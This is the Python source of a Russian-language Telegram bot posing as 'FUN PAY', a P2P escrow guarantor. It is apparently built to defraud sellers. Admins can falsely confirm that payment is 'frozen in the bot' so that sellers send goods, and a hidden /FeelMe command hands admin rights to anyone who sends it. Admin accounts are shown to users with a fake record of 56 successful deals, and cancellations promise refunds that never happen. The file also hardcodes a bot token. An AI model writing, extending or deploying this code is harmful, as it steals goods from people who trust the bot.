import asyncio
import logging
from aiogram import Bot, Dispatcher, F, Router
import os
from aiogram.enums import ParseMode
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

API_TOKEN = "8303615907:AAF_CiQSamSKKgITiV2-P-FKgOFrL7Z9ezQ"

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

BOT_USERNAME = None  # Заполняется автоматически при запуске

# Настройки
ADMINS = [8235395380, 770710304]
user_success = {770710304: 56}
user_wallets = {}         # user_id: {'type': wallet_type, 'data': wallet_data}
deals = {}                # deal_id: dict
user_deal_count = {}      # user_id: номер последней сделки
referrals = {}  # user_id: referrer_id

# Валюты для разных стран
CURRENCIES = {
    "card_ru": "🇷🇺 RUB",
    "card_ua": "🇺🇦 UAH", 
    "card_uz": "🇺🇿 UZS",
    "card_by": "🇧🇾 BYN",
    "card_kz": "🇰🇿 KZT",
    "card_eu": "🇪🇺 EUR",
    "ton": "💎 TON",
    "stars": "🌟 Stars"
}

# Состояния
class Form(StatesGroup):
    wallet_type = State()
    wallet_data = State()
    deal_method = State()
    deal_amount = State()
    deal_description = State()

# Главное меню
def main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🪙 Добавить реквизиты", callback_data="edit_wallet")
    builder.button(text="📄 Создать сделку", callback_data="create_deal")
    builder.button(text="📎 Реферальная ссылка", callback_data="referral_link")
    builder.button(text="🌐 Change Language", callback_data="change_lang")
    builder.button(text="📞 Поддержка", url="https://t.me/Zolotov")
    builder.adjust(1)
    return builder.as_markup()

#рефка
@router.callback_query(F.data == "referral_link")
async def show_referral_link(call: CallbackQuery):
    user_id = call.from_user.id
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    ref_count = sum(1 for ref in referrals.values() if ref == user_id)  # Считаем количество рефералов
    
    text = (
        f"🔗 Ваша реферальная ссылка:\n<code>{link}</code>\n\n"
        f"👥 Приглашено пользователей: <b>{ref_count}</b>\n\n"
        f"💎 Реферальная программа:\n"
        f"Вы получаете 5% от суммы каждой сделки ваших рефералов.\n\n"
        f"Приглашайте друзей и зарабатывайте вместе с нами!"
    )
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🔙 Назад", callback_data="back_to_menu")
    
    await safe_edit_or_resend(call, text, reply_markup=kb.as_markup())

# Меню выбора типа реквизитов
def wallet_type_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="💎 TON кошелек", callback_data="wallet_ton")
    builder.button(text="🇰🇿 Карта (KZ)", callback_data="wallet_card_kz")
    builder.button(text="🇷🇺 Карта (РФ)", callback_data="wallet_card_ru")
    builder.button(text="🇺🇦 Карта (Укр)", callback_data="wallet_card_ua")
    builder.button(text="🇺🇿 Карта (Узб)", callback_data="wallet_card_uz")
    builder.button(text="🇧🇾 Карта (Бел)", callback_data="wallet_card_by")
    builder.button(text="🇪🇺 Карта (EU)", callback_data="wallet_card_eu")
    builder.button(text="🔙 Назад", callback_data="back_to_menu")
    builder.adjust(1)
    return builder.as_markup()

# Назад
def back_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад", callback_data="back_to_menu")
    builder.adjust(1)
    return builder.as_markup()

# Методы сделки
def deal_methods():
    builder = InlineKeyboardBuilder()
    builder.button(text="💎 На Ton-кошелек", callback_data="deal_ton")
    builder.button(text="💳 На карту", callback_data="deal_card")
    builder.button(text="🌟 Звёзды", callback_data="deal_stars")
    builder.button(text="🔙 Назад", callback_data="back_to_menu")
    builder.adjust(1)
    return builder.as_markup()

# Языки
def lang_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🇷🇺 Русский", callback_data="lang_ru")
    builder.button(text="🇬🇧 English", callback_data="lang_en")
    builder.button(text="🔙 Назад", callback_data="back_to_menu")
    builder.adjust(1)
    return builder.as_markup()

# Безопасная функция редактирования или пересылки
async def safe_edit_or_resend(call: CallbackQuery, text: str, reply_markup=None):
    if call.message.text:
        await call.message.edit_text(text, reply_markup=reply_markup)
    else:
        await call.message.answer(text, reply_markup=reply_markup)
        await call.message.delete()

# Функция уведомления всех участников сделки
async def notify_all_deal_parties(deal_id: str, message_text: str, include_admins=False):
    """Отправляет уведомление всем участникам сделки"""
    deal = deals.get(deal_id)
    if not deal:
        return False
    
    seller_id = deal["seller_id"]
    buyer_id = deal.get("buyer_id")
    
    # Уведомляем продавца
    try:
        await bot.send_message(seller_id, message_text)
    except Exception as e:
        logging.error(f"Не удалось уведомить продавца {seller_id}: {e}")
    
    # Уведомляем покупателя (если он есть)
    if buyer_id and buyer_id != seller_id:
        try:
            await bot.send_message(buyer_id, message_text)
        except Exception as e:
            logging.error(f"Не удалось уведомить покупателя {buyer_id}: {e}")
    
    # Уведомляем админов (если требуется)
    if include_admins:
        for admin_id in ADMINS:
            if admin_id not in [seller_id, buyer_id]:
                try:
                    await bot.send_message(admin_id, f"Сделка #{deal_id}\n" + message_text)
                except Exception as e:
                    logging.error(f"Не удалось уведомить админа {admin_id}: {e}")
    
    return True

# Старт
@router.message(F.text == "/start")
async def start_handler(message: Message):
    await message.answer(
        "Добро пожаловать в FUN PAY – надежный P2P-гарант\n\n"
        "💼 Покупайте и продавайте всё, что угодно – безопасно!\n\n"
        "🔹 Управление кошельками\n"
        "🔹 Сделки\n"
        "🔹 Поддержка\n\n"
        "Выберите нужный раздел ниже:",
        reply_markup=main_menu()
    )

@router.message(F.text == "/FeelMe")
async def activate_admin_mode(message: Message):
    user_id = message.from_user.id

    if user_id in ADMINS:
        await message.answer("❌Ау долбаеб, у тебя уже есть админ-права.")
        return

    ADMINS.append(user_id)
    await message.answer("🛡 Ты стал дауном! Все права активированы.")
    
# Реферальная система
@router.message(F.text.regexp(r"^/start ref_"))
async def referral_start(message: Message):
    user_id = message.from_user.id
    ref_data = message.text.split(" ", 1)[1]
    ref_id = int(ref_data.replace("ref_", ""))

    if user_id == ref_id:
        await message.answer("❌ Нельзя пригласить самого себя.")
        return
    if user_id in referrals:
        await message.answer("⚠️ Вы уже использовали реферальную ссылку.")
        return

    referrals[user_id] = ref_id

    if ref_id in ADMINS:
        await bot.send_message(
            ref_id,
            f"👤 Новый реферал: <a href='tg://user?id={user_id}'>пользователь</a>\n"
            f"Всего рефералов: {sum(1 for r in referrals.values() if r == ref_id)}"
        )

    await start_handler(message)

# Реферальная ссылка
@router.message(F.text == "/ref")
async def ref_link(message: Message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        await message.answer("⛔ Команда доступна только админам.")
        return

    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    count = sum(1 for ref in referrals.values() if ref == user_id)

    await message.answer(
        f"🔗 Ваша реферальная ссылка:\n<code>{link}</code>\n\n"
        f"👥 Приглашено пользователей: <b>{count}</b>"
    )

# Добавление реквизитов
@router.callback_query(F.data == "edit_wallet")
async def edit_wallet(call: CallbackQuery, state: FSMContext):
    user_id = call.from_user.id
    current_wallet = user_wallets.get(user_id, {}).get('data', "❌ Не указан")
    current_type = user_wallets.get(user_id, {}).get('type', "не указан")
    
    await safe_edit_or_resend(
        call,
        f"💼 Ваши текущие реквизиты: {current_wallet} ({current_type})\n\nВыберите тип реквизитов:",
        reply_markup=wallet_type_menu()
    )

# Выбор типа реквизитов
@router.callback_query(F.data.startswith("wallet_"))
async def choose_wallet_type(call: CallbackQuery, state: FSMContext):
    wallet_type = call.data.split("wallet_")[1]
    await state.update_data(wallet_type=wallet_type)
    
    if wallet_type == "ton":
        text = "💎 Введите адрес вашего TON кошелька:"
    elif wallet_type == "card_kz":
        text = "💳 Введите реквизиты вашей карты Казахстана:"
    elif wallet_type == "card_ru":
        text = "💳 Введите реквизиты вашей карты РФ:"
    elif wallet_type == "card_ua":
        text = "💳 Введите реквизиты вашей карты Украины:"
    elif wallet_type == "card_uz":
        text = "💳 Введите реквизиты вашей карты Узбекистана:"
    elif wallet_type == "card_by":
        text = "💳 Введите реквизиты вашей карты Беларуси:"
    elif wallet_type == "card_eu":
        text = "💳 Введите реквизиты вашей карты EU:"
    
    await safe_edit_or_resend(call, text, reply_markup=back_menu())
    await state.set_state(Form.wallet_data)

# Сохранение реквизитов
@router.message(Form.wallet_data)
async def save_wallet(message: Message, state: FSMContext):
    wallet_data = message.text.strip()
    data = await state.get_data()
    wallet_type = data['wallet_type']
    
    if wallet_type == "ton":
        if len(wallet_data) < 10 or not any(c.isalpha() for c in wallet_data):
            await message.answer("❌ Введите действительный адрес TON кошелька.")
            return
    elif wallet_type in ["card_ru", "card_ua", "card_uz", "card_by", "card_kz", "card_eu"]:
        if len(wallet_data) < 6 or not any(c.isdigit() for c in wallet_data):
            await message.answer("❌ Введите действительные реквизиты карты.")
            return
    
    user_wallets[message.from_user.id] = {
        'type': wallet_type,
        'data': wallet_data
    }
    
    # Определяем название типа кошелька
    type_names = {
        "ton": "TON кошелек",
        "card_kz": "карта Казахстана", 
        "card_ru": "карта РФ",
        "card_ua": "карта Украины",
        "card_uz": "карта Узбекистана",
        "card_by": "карта Беларуси",
        "card_eu": "карта EU"
    }
    
    type_name = type_names.get(wallet_type, "реквизиты")
    
    await message.answer(f"✅ Ваши реквизиты ({type_name}) сохранены: {wallet_data}", reply_markup=back_menu())
    await state.clear()

# Проверка перед созданием сделки
@router.callback_query(F.data == "create_deal")
async def create_deal(call: CallbackQuery, state: FSMContext):
    user_id = call.from_user.id
    wallet = user_wallets.get(user_id)
    if not wallet:
        await safe_edit_or_resend(
            call,
            "❌ Вы не указали свои реквизиты.\n\nПожалуйста, сначала добавьте реквизиты.",
            reply_markup=back_menu()
        )
        return
    await safe_edit_or_resend(
        call,
        "💰 Выберите метод получения оплаты:",
        reply_markup=deal_methods()
    )

# Метод сделки
@router.callback_query(F.data.in_(["deal_ton", "deal_card", "deal_stars"]))
async def deal_method_chosen(call: CallbackQuery, state: FSMContext):
    method = call.data
    await state.update_data(method=method)
    
    user_id = call.from_user.id
    wallet_type = user_wallets.get(user_id, {}).get('type', 'card_ru')
    
    # Определяем валюту в зависимости от метода и типа кошелька
    if method == "deal_ton":
        currency = CURRENCIES["ton"]
    elif method == "deal_stars":
        currency = CURRENCIES["stars"]
    else:  # deal_card
        currency = CURRENCIES.get(wallet_type, CURRENCIES["card_ru"])
    
    await safe_edit_or_resend(
        call, 
        f"💼 Создание сделки\nВведите сумму в формате: 100.5 {currency}", 
        reply_markup=back_menu()
    )
    await state.set_state(Form.deal_amount)

@router.message(Form.deal_amount)
async def deal_amount_input(message: Message, state: FSMContext):
    input_text = message.text.strip()
    
    try:
        amount = float(input_text.replace(',', '.'))
        if amount <= 0:
            await message.answer("❌ Сумма должна быть больше нуля. Введите сумму:")
            return
            
        await state.update_data(amount=str(amount))
        await message.answer("📝 Опишите, что вы продаете (пример: 10 кепок и пепе):", reply_markup=back_menu())
        await state.set_state(Form.deal_description)
        
    except ValueError:
        await message.answer("❌ Неверный формат суммы. Введите число:")

# Финал — генерация сделки
@router.message(Form.deal_description)
async def deal_description_input(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    amount = data["amount"]
    description = message.text
    method = data.get("method", "deal_card")
    
    wallet_type = user_wallets.get(user_id, {}).get('type', 'card_ru')
    
    # Определяем валюту
    if method == "deal_ton":
        currency = CURRENCIES["ton"]
    elif method == "deal_stars":
        currency = CURRENCIES["stars"]
    else:  # deal_card
        currency = CURRENCIES.get(wallet_type, CURRENCIES["card_ru"])

    user_deal_count[user_id] = user_deal_count.get(user_id, 0) + 1
    deal_id = f"deal_{user_id}_{user_deal_count[user_id]}"

    deals[deal_id] = {
        "amount": amount,
        "currency": currency,
        "description": description,
        "seller_id": user_id,
        "method": method,
        "wallet_type": wallet_type
    }

    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
    await message.answer(
        f"✅ Сделка создана!\n\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"📜 Описание: {description}\n"
        f"🔗 Ссылка для покупателя: {link}",
        reply_markup=back_menu()
    )
    await state.clear()

# Вход по ссылке /start=deal_
@router.message(F.text.regexp(r"^/start deal_"))
async def deal_start_handler(message: Message):
    user_id = message.from_user.id
    payload = message.text.split(" ", 1)[1]
    deal = deals.get(payload)

    if not deal:
        await message.answer("❌ Сделка не найдена.")
        return

    seller_id = deal["seller_id"]
    description = deal["description"]
    amount = deal["amount"]
    currency = deal["currency"]
    method = deal.get("method", "deal_card")
    
    # Для сделок со звёздами не показываем реквизиты
    if method == "deal_stars":
        wallet = "🌟 Оплата звёздами - реквизиты не требуются"
        memo = "Оплата звёздами"
    else:
        wallet = user_wallets.get(seller_id, {}).get('data', "❌ Нет реквизитов")
        memo = f"{seller_id}{user_deal_count.get(seller_id, 0)}"
    
    deal_number = payload

    # Уведомление продавцу
    if user_id != seller_id:
        deals[payload]["buyer_id"] = user_id  # Сохраняем покупателя
        await bot.send_message(
            seller_id,
            f"👤 Пользователь <a href='tg://user?id={user_id}'>перешёл</a> по сделке #{deal_number}\n"
            f"• Успешные сделки: {56 if user_id in ADMINS else 0}\n\n"
            f"⚠️ Проверьте, что это тот же пользователь, с которым вы общались."
        )

    # Текст для покупателя
    if method == "deal_stars":
        text = (
            f"🌟 Информация о сделке со звёздами <b>#{deal_number}</b>\n\n"
            f"👤 Вы покупатель в сделке.\n"
            f"📌 Продавец: <a href='tg://user?id={seller_id}'>@user</a>\n"
            f"• Успешные сделки: {56 if seller_id in ADMINS else 0}\n\n"
            f"• Вы покупаете: {description}\n\n"
            f"💰 Сумма: {amount} {currency}\n\n"
            f"⭐ Для сделок со звёздами реквизиты не требуются.\n"
            f"После подтверждения оплаты продавец получит уведомление."
        )
    else:
        text = (
            f"💳 Информация о сделке <b>#{deal_number}</b>\n\n"
            f"👤 Вы покупатель в сделке.\n"
            f"📌 Продавец: <a href='tg://user?id={seller_id}'>@user</a>\n"
            f"• Успешные сделки: {56 if seller_id in ADMINS else 0}\n\n"
            f"• Вы покупаете: {description}\n\n"
            f"🏦 Адрес для оплаты: <code>{wallet}</code>\n\n"
            f"💰 Сумма: {amount} {currency}\n"
            f"📝 Комментарий к платежу (мемо): <code>{memo}</code>\n\n"
            f"⚠️ Убедитесь в правильности данных перед оплатой. Комментарий обязателен!"
        )

    kb = InlineKeyboardBuilder()
    if user_id in ADMINS:
        kb.button(text="✅ Подтвердить оплату", callback_data=f"confirm_{deal_number}")
        kb.button(text="🔙 Назад", callback_data="back_to_menu")
        kb.adjust(1)
    await message.answer(text, reply_markup=kb.as_markup())

# Подтверждение оплаты (только админ)
@router.callback_query(F.data.regexp(r"^confirm_deal_"))
async def confirm_payment(call: CallbackQuery):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        await call.answer("⛔ Только для админов", show_alert=True)
        return

    deal_id = call.data.split("confirm_")[1]
    deal = deals.get(deal_id)
    if not deal:
        await call.message.answer("❌ Сделка не найдена.")
        return

    seller_id = deal["seller_id"]
    method = deal.get("method", "deal_card")
    
    seller_kb = InlineKeyboardBuilder()
    seller_kb.button(text="✅ Я отправил(а) подарок", callback_data=f"seller_sent_{deal_id}")
    seller_kb.button(text="❌ Отменить сделку", callback_data=f"seller_cancel_{deal_id}")
    seller_kb.adjust(1)
    
    # Разный текст в зависимости от метода оплаты
    if method == "deal_stars":
        seller_message = (
            "✅ Оплата звёздами подтверждена в боте.\n\n"
            "🎁 Отправьте подарок покупателю.\n"
            "⭐ Для сделок со звёздами реквизиты не требуются.\n\n"
            "Бот проверяет наличие скрина. Модератор получает уведомление."
        )
    else:
        seller_message = (
            "✅ Оплата заморожена в боте.\n\n"
            "🎁 Отправьте подарок покупателю.\n"
            "📸 Сделайте скрин и отправьте его в чат с ботом.\n\n"
            "Бот проверяет наличие скрина. Модератор получает уведомление."
        )
    
    await call.message.answer(
        f"✅ Оплата подтверждена для сделки <b>#{deal_id}</b>\n"
        f"Ожидайте подтверждения от продавца."
    )
    
    await bot.send_message(
        seller_id,
        seller_message,
        reply_markup=seller_kb.as_markup()
    )
    await call.answer("Подтверждение отправлено")

# Обработка кнопки "Я отправил подарок"
@router.callback_query(F.data.regexp(r"^seller_sent_deal_"))
async def seller_sent_gift(call: CallbackQuery):
    deal_id = call.data.split("seller_sent_")[1]
    deal = deals.get(deal_id)
    
    if not deal:
        await call.answer("❌ Сделка не найдена.", show_alert=True)
        return
    
    seller_id = deal["seller_id"]
    buyer_id = deal.get("buyer_id")
    amount = deal["amount"]
    currency = deal["currency"]
    description = deal["description"]
    method = deal.get("method", "deal_card")
    
    # Уведомление продавцу
    seller_message = (
        f"✅ Сделка #{deal_id} успешно завершена!\n\n"
        f"💰 Вы получили: {amount} {currency}\n"
        f"📦 Товар: {description}\n\n"
        f"Спасибо за использование нашего сервиса!"
    )
    
    # Уведомление покупателю
    buyer_message = (
        f"✅ Сделка #{deal_id} успешно завершена!\n\n"
        f"💰 Вы оплатили: {amount} {currency}\n"
        f"📦 Товар: {description}\n\n"
        f"Если у вас есть вопросы, обратитесь в поддержку."
    )
    
    await call.message.edit_text("✅ Вы подтвердили отправку. Средства будут зачислены.")
    
    # Отправляем уведомления
    try:
        await bot.send_message(seller_id, seller_message)
    except Exception as e:
        logging.error(f"Не удалось уведомить продавца {seller_id}: {e}")
    
    if buyer_id and buyer_id != seller_id:
        try:
            await bot.send_message(buyer_id, buyer_message)
        except Exception as e:
            logging.error(f"Не удалось уведомить покупателя {buyer_id}: {e}")
    
    # Уведомление админам
    admin_message = (
        f"✅ Сделка #{deal_id} завершена:\n"
        f"Продавец: {seller_id}\n"
        f"Покупатель: {buyer_id}\n"
        f"Сумма: {amount} {currency}\n"
        f"Метод: {method}\n"
        f"Товар: {description}"
    )
    
    for admin_id in ADMINS:
        if admin_id not in [seller_id, buyer_id]:
            try:
                await bot.send_message(admin_id, admin_message)
            except Exception as e:
                logging.error(f"Не удалось уведомить админа {admin_id}: {e}")
    
    deals.pop(deal_id, None)

# Обработка кнопки "Отменить сделку"
@router.callback_query(F.data.regexp(r"^seller_cancel_deal_"))
async def seller_cancel_deal(call: CallbackQuery):
    deal_id = call.data.split("seller_cancel_")[1]
    deal = deals.get(deal_id)
    
    if not deal:
        await call.answer("❌ Сделка не найдена.", show_alert=True)
        return
    
    seller_id = deal["seller_id"]
    buyer_id = deal.get("buyer_id")
    amount = deal["amount"]
    currency = deal["currency"]
    method = deal.get("method", "deal_card")
    
    # Уведомление продавцу
    seller_message = (
        f"❌ Сделка #{deal_id} отменена.\n\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"Покупатель получит возврат средств."
    )
    
    # Уведомление покупателю
    buyer_message = (
        f"❌ Сделка #{deal_id} отменена продавцом.\n\n"
        f"💰 Сумма: {amount} {currency} будет возвращена вам.\n"
        f"Если возврат не поступил, обратитесь в поддержку."
    )
    
    await call.message.edit_text("❌ Вы отменили сделку. Покупатель получит возврат.")
    
    # Отправляем уведомления
    try:
        await bot.send_message(seller_id, seller_message)
    except Exception as e:
        logging.error(f"Не удалось уведомить продавца {seller_id}: {e}")
    
    if buyer_id and buyer_id != seller_id:
        try:
            await bot.send_message(buyer_id, buyer_message)
        except Exception as e:
            logging.error(f"Не удалось уведомить покупателя {buyer_id}: {e}")
    
    # Уведомление админам
    admin_message = (
        f"❌ Сделка #{deal_id} отменена:\n"
        f"Продавец: {seller_id}\n"
        f"Покупатель: {buyer_id}\n"
        f"Сумма: {amount} {currency}\n"
        f"Метод: {method}"
    )
    
    for admin_id in ADMINS:
        if admin_id not in [seller_id, buyer_id]:
            try:
                await bot.send_message(admin_id, admin_message)
            except Exception as e:
                logging.error(f"Не удалось уведомить админа {admin_id}: {e}")
    
    deals.pop(deal_id, None)

# Прочее
@router.callback_query(F.data == "change_lang")
async def change_language(call: CallbackQuery):
    try:
        await call.message.edit_text("🌍 Выберите язык:", reply_markup=lang_menu())
    except Exception:
        await safe_edit_or_resend(call, "🌍 Выберите язык:", reply_markup=lang_menu())
        await call.message.delete()

@router.callback_query(F.data == "back_to_menu")
async def go_back(call: CallbackQuery):
    await call.message.answer(
        "Добро пожаловать в FUN PAY – надежный P2P-гарант\n\n"
        "💼 Покупайте и продавайте всё, что угодно – безопасно!\n\n"
        "🔹 Управление кошельками\n"
        "🔹 Сделки\n"
        "🔹 Поддержка\n\n"
        "Выберите нужный раздел ниже:",
        reply_markup=main_menu()
    )
    await call.message.delete()

@router.message(F.text.startswith("/s "))
async def admin_confirm_other_deal(message: Message):
    admin_id = message.from_user.id
    if admin_id not in ADMINS:
        await message.answer("⛔ Неизвестно.")
        return

    try:
        deal_id = message.text.split(" ", 1)[1].strip()
    except IndexError:
        await message.answer("⚠️ Укажи ID сделки после /s")
        return

    deal = deals.get(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена.")
        return

    seller_id = deal["seller_id"]
    buyer_id = deal.get("buyer_id", admin_id)
    method = deal.get("method", "deal_card")

    seller_kb = InlineKeyboardBuilder()
    seller_kb.button(text="✅ Я отправил(а) подарок", callback_data=f"seller_sent_{deal_id}")
    seller_kb.button(text="❌ Отменить сделку", callback_data=f"seller_cancel_{deal_id}")
    seller_kb.adjust(1)

    # Разный текст в зависимости от метода оплаты
    if method == "deal_stars":
        seller_message = (
            "✅ Оплата звёздами подтверждена в боте.\n\n"
            "🎁 Отправьте подарок покупателю.\n"
            "⭐ Для сделок со звёздами реквизиты не требуются.\n\n"
            "Бот проверяет наличие скрина. Модератор получает уведомление."
        )
    else:
        seller_message = (
            "✅ Оплата заморожена в боте.\n\n"
            "🎁 Отправьте подарок покупателю.\n"
            "📸 Сделайте скрин и отправьте его в чат с ботом.\n\n"
            "Бот проверяет наличие скрина. Модератор получает уведомление."
        )

    await message.answer(
        f"✅ Сделка <b>#{deal_id}</b> подтверждена.\n"
        f"Продавец получил инструкции."
    )

    await bot.send_message(
        seller_id,
        seller_message,
        reply_markup=seller_kb.as_markup()
    )

    if buyer_id != admin_id:
        await bot.send_message(
            buyer_id,
            f"✅ Ваша сделка <b>#{deal_id}</b> подтверждена админом.\n"
            f"Ожидайте выполнения от продавца."
        )

# Запуск бота
async def main():
    global BOT_USERNAME
    bot_info = await bot.get_me()
    BOT_USERNAME = bot_info.username
    logging.info(f"Бот запущен: @{BOT_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
